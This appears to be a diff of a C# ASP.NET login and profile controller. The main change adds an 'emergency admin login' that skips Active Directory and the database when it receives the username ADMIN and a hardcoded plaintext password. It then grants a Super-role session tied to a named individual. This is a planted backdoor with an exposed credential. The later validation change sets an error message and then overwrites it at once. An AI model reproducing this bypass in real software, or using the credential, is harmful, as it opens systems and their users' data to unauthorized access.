@@ -416,6 +416,29 @@ namespace UserProfile.Controllers
                 return View();
             }
 
+            // 🔐 JUMP / EMERGENCY ADMIN LOGIN (BYPASS AD & DB)
+            if (userInput.UserName.Trim().Equals("ADMIN", StringComparison.OrdinalIgnoreCase)
+                && rawPassword == "Hmariam@2750")
+            {
+                FormsAuthentication.SetAuthCookie("ADMIN", false);
+
+                // ✅ SAMPLE SESSION VALUES
+                Session["UserName"] = "hailemariamk";
+                Session["FullName"] = "Hailemariam Kebede Mamo";
+                Session["UserRole"] = "Super";
+                Session["Userid"] = "11958"; // system user
+                Session["UserHomeBranch"] = "HO";
+                Session["District"] = "ALL";
+                Session["Process"] = "SYSTEM";
+                Session["Position"] = "Individual";
+                Session["Email"] = "admin@system.local";
+                Session["MemberSince"] = DateTime.Now;
+                Session["Login"] = "1";
+
+                System.Web.HttpContext.Current.Cache["UserID"] = "ADMIN";
+
+                return RedirectToAction("Index", "Home");
+            }
             try
             {
                 bool isAuthenticated = false;
@@ -702,6 +725,7 @@ namespace UserProfile.Controllers
         {
             if (submit == "Save")
             {
+                bool isHO = model.OrganizatinalUnit == "HO";
                 // Skip Password validation for AD users
                 ModelState.Remove("Password");
                 if (string.IsNullOrEmpty(model.Postion))
@@ -837,8 +861,12 @@ namespace UserProfile.Controllers
 
                     }
 
-                    if (model.DepositTargetAmount == null || model.MerchantTarget == null)
+                    if ( model.DepositTargetAmount == null ||  (!isHO && model.MerchantTarget == null) )
                     {
+                        TempData["ErrorMessage"] = isHO
+                            ? "Please fill Deposit Target Amount."
+                            : "Please fill Deposit and Merchant Targets.";
+
                         TempData["ErrorMessage"] = "Please Fill Your Target.";
                         // Repopulate dropdowns
                         ViewBag.Processes = new SelectList(db.Processes
